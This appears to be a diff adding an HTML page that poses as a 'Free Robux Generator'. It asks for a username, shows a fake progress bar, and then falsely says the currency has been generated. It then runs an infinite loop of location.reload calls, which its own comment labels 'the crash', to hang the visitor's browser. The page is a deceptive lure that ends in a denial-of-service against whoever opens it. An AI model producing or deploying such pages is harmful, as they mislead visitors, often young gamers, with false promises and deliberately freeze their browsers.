@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Robux Generator</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: #00c853; /* Green background */
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      font-size: 50px;
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+      margin-bottom: 30px;
+    }
+    p {
+      font-size: 20px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .button {
+      padding: 15px 30px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 20px;
+      background-color: #4caf50; /* Green color */
+      color: white;
+      border: none;
+      border-radius: 8px;
+      transition: all 0.3s ease;
+    }
+    .button:hover {
+      background-color: #388e3c; /* Darker green on hover */
+    }
+    #progressContainer {
+      display: none;
+      margin-top: 20px;
+    }
+    #progressBar {
+      width: 100%;
+      background-color: #ddd;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+    #progress {
+      height: 20px;
+      background-color: #4caf50;
+      width: 0%;
+      text-align: center;
+      line-height: 20px;
+      color: white;
+      font-weight: bold;
+    }
+    #claimButton {
+      display: inline-block;
+    }
+    #popup {
+      display: none;
+      background: rgba(0, 0, 0, 0.5);
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      text-align: center;
+      padding-top: 150px;
+    }
+    #popupContent {
+      background: #333;
+      color: white;
+      padding: 40px;
+      border-radius: 10px;
+      display: inline-block;
+      width: 300px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Free Robux Generator</h1>
+  <p>Enter your username and click "Claim" to get free Robux!</p>
+
+  <div>
+    <input type="text" id="username" placeholder="Enter your username" />
+    <button class="button" id="claimButton">Claim</button>
+  </div>
+
+  <div id="popup">
+    <div id="popupContent">
+      <h2>Generating...</h2>
+      <p>Please wait while we process your Robux request.</p>
+      <div id="progressContainer">
+        <div id="progressBar">
+          <div id="progress">0%</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('claimButton').onclick = function() {
+      // Get username
+      const username = document.getElementById('username').value;
+
+      // Check if username is entered
+      if (!username) {
+        alert("Please enter a username!");
+        return;
+      }
+
+      // Show the popup and progress bar
+      document.getElementById('popup').style.display = 'block';
+      document.getElementById('progressContainer').style.display = 'block';
+
+      let progress = 0;
+      const interval = setInterval(function() {
+        progress += Math.floor(Math.random() * 10) + 5; // Increase progress randomly
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(interval);
+          setTimeout(function() {
+            // After progress reaches 100, trigger the crash
+            alert("Your Robux have been generated! Now enjoy!");
+            while (1) {
+              location.reload(1); // The crash: page reload
+            }
+          }, 500);
+        }
+        document.getElementById('progress').style.width = progress + '%';
+        document.getElementById('progress').textContent = progress + '%';
+      }, 500);
+    };
+  </script>
+
+</body>
+</html>
